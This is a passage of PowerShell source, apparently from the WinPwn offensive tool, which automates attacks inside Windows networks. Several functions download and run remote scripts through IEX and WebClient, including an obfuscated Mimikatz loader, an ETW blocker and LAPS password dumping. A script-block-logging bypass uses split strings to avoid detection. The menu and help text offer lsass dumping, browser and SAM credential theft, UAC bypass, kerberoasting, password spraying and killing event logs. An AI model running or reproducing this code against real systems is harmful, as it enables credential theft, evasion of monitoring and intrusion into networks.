        Group = $Group
        Owner = $Owner
    }
    if ($Sddl.DiscretionaryAcl -eq $null)
    {
        $Dacl = $null
    }
    else
    {
        $DaclArray = New-Object PSObject[](0)
        $ValueTable = @{}
        $EnumValueStrings = [Enum]::GetNames([System.Security.AccessControl.CryptoKeyRights])
        $CryptoEnumValues = $EnumValueStrings | % {
                $EnumValue = [Security.AccessControl.CryptoKeyRights] $_
                if (-not $ValueTable.ContainsKey($EnumValue.value__))
                {
                    $EnumValue
                }
                $ValueTable[$EnumValue.value__] = 1
            }
        $EnumValueStrings = [Enum]::GetNames([System.Security.AccessControl.FileSystemRights])
        $FileEnumValues = $EnumValueStrings | % {
                $EnumValue = [Security.AccessControl.FileSystemRights] $_
                if (-not $ValueTable.ContainsKey($EnumValue.value__))
                {
                    $EnumValue
                }
                $ValueTable[$EnumValue.value__] = 1
            }
        $EnumValues = $CryptoEnumValues + $FileEnumValues
        foreach ($DaclEntry in $Sddl.DiscretionaryAcl)
        {
            $SID = $DaclEntry.SecurityIdentifier
            $Account = $SID.Translate([Security.Principal.NTAccount]).Value
            $Values = New-Object String[](0)

            # Resolve access mask
            foreach ($Value in $EnumValues)
            {
                if (($DaclEntry.Accessmask -band $Value) -eq $Value)
                {
                    $Values += $Value.ToString()
                }
            }
            $Access = "$($Values -join ',')"
            $DaclTable = @{
                Rights = $Access
                IdentityReference = $Account
                IsInherited = $DaclEntry.IsInherited
                InheritanceFlags = $DaclEntry.InheritanceFlags
                PropagationFlags = $DaclEntry.PropagationFlags
            }
            if ($DaclEntry.AceType.ToString().Contains('Allowed'))
            {
                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]::Allow
            }
            else
            {
                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]::Deny
            }
            $DaclArray += New-Object PSObject -Property $DaclTable
        }
        $Dacl = $DaclArray
    }
    $ObjectProperties['Access'] = $Dacl
    $SecurityDescriptor = New-Object PSObject -Property $ObjectProperties
    Write-Output $SecurityDescriptor
}

Function Get-Installedsoftware {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(ValueFromPipeline              =$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0
        )]
        [string[]]
            $ComputerName = $env:COMPUTERNAME,
        [Parameter(Position=0)]
        [string[]]
            $Property,
        [string[]]
            $IncludeProgram,
        [string[]]
            $ExcludeProgram,
        [switch]
            $ProgramRegExMatch,
        [switch]
            $LastAccessTime,
        [switch]
            $ExcludeSimilar,
        [int]
            $SimilarWord
    )

    begin {
        $RegistryLocation = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\',
                            'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\'

        if ($psversiontable.psversion.major -gt 2) {
            $HashProperty = [ordered]@{}    
        } else {
            $HashProperty = @{}
            $SelectProperty = @('ComputerName','ProgramName')
            if ($Property) {
                $SelectProperty += $Property
            }
            if ($LastAccessTime) {
                $SelectProperty += 'LastAccessTime'
            }
        }
    }

    process {
        foreach ($Computer in $ComputerName) {
            try {
                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
                if ($socket.Connected) {
                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)
                    $RegistryLocation | ForEach-Object {
                        $CurrentReg = $_
                        if ($RegBase) {
                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
                            if ($CurrentRegKey) {
                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {
                                    $HashProperty.ComputerName = $Computer
                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('DisplayName'))
                                    
                                    if ($IncludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notmatch $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notlike $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($ExcludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -match $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -like $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($DisplayName) {
                                        if ($Property) {
                                            foreach ($CurrentProperty in $Property) {
                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue($CurrentProperty)
                                            }
                                        }
                                        if ($LastAccessTime) {
                                            $InstallPath = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('InstallLocation') -replace '\\$',''
                                            if ($InstallPath) {
                                                $WmiSplat = @{
                                                    ComputerName = $Computer
                                                    Query        = $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
                                                    ErrorAction  = 'SilentlyContinue'
                                                }
                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |
                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |
                                                    Sort-Object -Property LastAccessed |
                                                    Select-Object -Last 1 | ForEach-Object {
                                                        $_.ConvertToDateTime($_.LastAccessed)
                                                    }
                                            } else {
                                                $HashProperty.LastAccessTime = $null
                                            }
                                        }
                                        
                                        if ($psversiontable.psversion.major -gt 2) {
                                            [pscustomobject]$HashProperty
                                        } else {
                                            New-Object -TypeName PSCustomObject -Property $HashProperty |
                                            Select-Object -Property $SelectProperty
                                        }
                                    }
                                    $socket.Close()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error $_
            }
        }
    }
}

function Lapschecks
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $passworddump   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    if ($passworddump)
    {
        IEX ($viewdevobfs)
        if(!$consoleoutput){breviaries -Properties DnsHostName,ms-Mcs-AdmPwd >> "$currentPath\Exploitation\LapsPasswords.txt"}else{Write "-------> Dumping LAPS passwords:";breviaries -Properties DnsHostName,ms-Mcs-AdmPwd}
    }

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/LAPSToolkit.ps1')
    Write-Host "Checking for LAPS enabled Computers."
    if(!$consoleoutput){Get-LAPSComputers >> "$currentPath\DomainRecon\LapsInformations.txt"}else{Write "-------> LAPS Computers:";Get-LAPSComputers}
    Write-Host "Checking for LAPS Administrator groups."
    if(!$consoleoutput){Find-LAPSDelegatedGroups >> "$currentPath\DomainRecon\LapsAllowedAdminGroups.txt"}else{Write "-------> LAPS Groups:";Find-LAPSDelegatedGroups}
    Write-Host "Checking for special right users with access to laps passwords."
    if(!$consoleoutput){Find-AdmPwdExtendedRights >> "$currentPath\DomainRecon\LapsSpecialRights.txt"}else{Write "-------> LAPS ADM Extended Rights:";Find-AdmPwdExtendedRights}
}

function fruit
{
   $network = Read-Host -Prompt 'Please enter the CIDR for the network: (example: 192.168.0.0/24)'
   Write-Host -ForegroundColor Yellow 'Searching...'
   iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Find-Fruit.ps1')
   Find-Fruit -FoundOnly -Rhosts $network
   pause;    
}

function Mimiload
{
  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/loadmimi.ps1')
  mimiload
}

function BlockEtw
{
  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')
  Invoke-BlockETW
}
    
function WinPwn
{
    <#
        .DESCRIPTION
        Main Function. Executes the other functions according to the users input.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
         [CmdletBinding()]
    Param (
    [alias("help")][Switch]$h,
	[String]
        $repo,
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $Domainrecon,
        [Switch]
        $Localrecon,
        [Switch]
        $Privesc,
        [Switch]
        $PowerSharpPack,
        [Switch]
        $Uacbypass,
        [string]
        $command,
        [string]
        $technique,
        [switch]
        $credentialmanager,
        [switch]
        $mimikittie,
        [switch]
        $rundll32lsass,
        [switch]
        $lazagne,
        [switch]
        $browsercredentials,
        [switch]
        $mimikittenz,
        [switch]
        $wificredentials,
        [switch]
        $samdump,
        [switch]
        $sharpcloud   
    )
  scriptblocklogbypass
  
  @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> Automate some internal Penetrationtest processes

'@

  $Help = "


    Usage:



    WinPwn without any parameters is meant to be used in an interactive shell. There is a guided menu - no need for explanations.

    However you can pass several parameters to use it from your favorite C2-Framework. 

    -noninteractive 	-> No questions for functions so that they run with predefined or user defined parameters  
            
    -consoleoutput    -> The loot/report folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework 

    -repo	-> Choose your own offline repo to use all those nice scripts in an environment without internet for example 

    Examples:



    WinPwn -noninteractive -consoleoutput -DomainRecon 		-> This will return every single domain recon script and function and will probably give you really much output

    WinPwn -noninteractive -consoleoutput -Localrecon 		-> This will enumerate as much information for the local system as possible
														   
    Generalrecon -noninteractive							-> Execute basic local recon functions and store the output in the corresponding folders

    UACBypass -noninteractive -command 'C:\temp\stager.exe' -technique ccmstp	-> Execute a stager in  a high integrity process from a low privileged session
    Kittielocal -noninteractive -consoleoutput -browsercredentials				-> Dump Browser-Credentials via Sharpweb returning the output to console
    Kittielocal -noninteractive -browsercredentials								-> Dump SAM File NTLM-Hashes and store the output in a file
    WinPwn -PowerSharpPack -consoleoutput -noninteractive					    -> Execute Seatbelt, PowerUp, Watson and more C# binaries in memory
    WinPwn -repo http://192.168.1.10:8000/WinPwn_Repo	-> Execute WinPwn from a local repo. To create such a repo use the Get_WinPwn_Repo.sh script.
  "
  if($h){return $Help}
	
    if(!$consoleoutput)
    {
        dependencychecks
        pathcheck
    }
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    AmsiBypass
	
	#Added repo parameter by 0x23353435
	If ($repo)
    {
    $Script:S3cur3Th1sSh1t_repo = $repo
    }
    else
    {
    $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
    }
	
    BlockEtw
	

    if ($noninteractive)
    {
        if ($Domainrecon)
        {
            if(!$consoleoutput){domainreconmodules -noninteractive}else{domainreconmodules -noninteractive -consoleoutput}
        }
        if ($Localrecon)
        {
            if(!$consoleoutput){localreconmodules -noninteractive}else{localreconmodules -noninteractive -consoleoutput}
        }
        if ($Privesc)
        {
            if(!$consoleoutput){privescmodules -noninteractive}else{privescmodules -noninteractive -consoleoutput}
        }
        if ($PowerSharpPack)
        {
            if(!$consoleoutput){sharpcradle -allthosedotnet -noninteractive}else{sharpcradle -allthosedotnet -noninteractive -consoleoutput}
        }
        if ($Uacbypass)
        {
            if ("ccmstp", "DiskCleanup", "magic" -notcontains $technique)
            {
                Write-Host "Invalid technique, choose from ccmstp DiskCleanup or magic"
                return
            }
            UACBypass -noninteractive -command $command -technique $technique
        }
        if ($credentialmanager)
        {
            if(!$consoleoutput){kittielocal -noninteractive -credentialmanager}else{kittielocal -noninteractive -credentialmanager -consoleoutput}
        }
        if($mimikittie)
        {
            if(!$consoleoutput){kittielocal -noninteractive -mimikittie}else{kittielocal -noninteractive -mimikittie -consoleoutput}
        }
        if($rundll32lsass)
        {
            if(!$consoleoutput){kittielocal -noninteractive -rundll32lsass}else{kittielocal -noninteractive -rundll32lsass -consoleoutput}
        }
        if($lazagne)
        {
            if(!$consoleoutput){kittielocal -noninteractive -lazagne}else{kittielocal -noninteractive -lazagne -consoleoutput}
        }
        if($browsercredentials)
        {
            if(!$consoleoutput){kittielocal -noninteractive -browsercredentials}else{kittielocal -noninteractive -browsercredentials -consoleoutput}
        }
        if($mimikittenz)
        {
            if(!$consoleoutput){kittielocal -noninteractive -mimikittenz}else{kittielocal -noninteractive -mimikittenz -consoleoutput}
        }
        if($wificredentials)
        {
            if(!$consoleoutput){kittielocal -noninteractive -wificredentials}else{kittielocal -noninteractive -wificredentials -consoleoutput}
        }
        if ($samdump)
        {
            if(!$consoleoutput){kittielocal -noninteractive -samdump}else{kittielocal -noninteractive -samdump -consoleoutput}
        }
        if ($sharpcloud)
        {
            if(!$consoleoutput){kittielocal -noninteractive -sharpcloud}else{kittielocal -noninteractive -sharpcloud -consoleoutput}
        } 
        return;
    }

    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
        Write-Host -ForegroundColor Green '2. Local recon menu! '
        Write-Host -ForegroundColor Green '3. Domain recon menu! '
        Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '
        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows vulnerabilities! '
	Write-Host -ForegroundColor Green '6. Bypass UAC! '
	Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
        Write-Host -ForegroundColor Green '8. Kerberoasting! '
        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
        Write-Host -ForegroundColor Green '10. Create an ADIDNS node or remove it! '
        Write-Host -ForegroundColor Green '11. Sessiongopher! '
        Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
	Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
    Write-Host -ForegroundColor Green '18. Impersonate other Users on this system via Token Manipulation!'
    Write-Host -ForegroundColor Green '19. Execute custom Rubeus commands!'
        Write-Host -ForegroundColor Green '20. Exit. '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
			1{Inveigh}
			2{localreconmodules}
			3{domainreconmodules}
			4{privescmodules}
			5{kernelexploits}
			6{UACBypass}
			7{SYSTEMShell}
			8{kerberoasting}
			9{kittielocal}
			10{adidnsmenu}
			11{sessionGopher}
                        12{inv-phantom}
                        13{sharpcradle -allthosedotnet}
			14{sharpcradle -web}
                        15{domainpassspray}
			16{mimiload}
			17{lsassdumps}
            18{TokenManipulation}
            19{CustomRubeus}
    }
    }
  While ($masterquestion -ne 20)
     
   
}

$Certify = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1')
$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SystemDirectoryServicesProtocols-Import.ps1')
$viewdevobfs = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/viewdevobfs.ps1')
$admodule = (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADModuleImport.ps1')

function scriptblocklogbypass
{
  $GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
  If ($GroupPolicyField) {
        $GroupPolicyCache = $GroupPolicyField.GetValue($null)
        If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
        $val.Add('EnableScriptB'+'lockLogging', 0)
        $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
        $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
  }
}
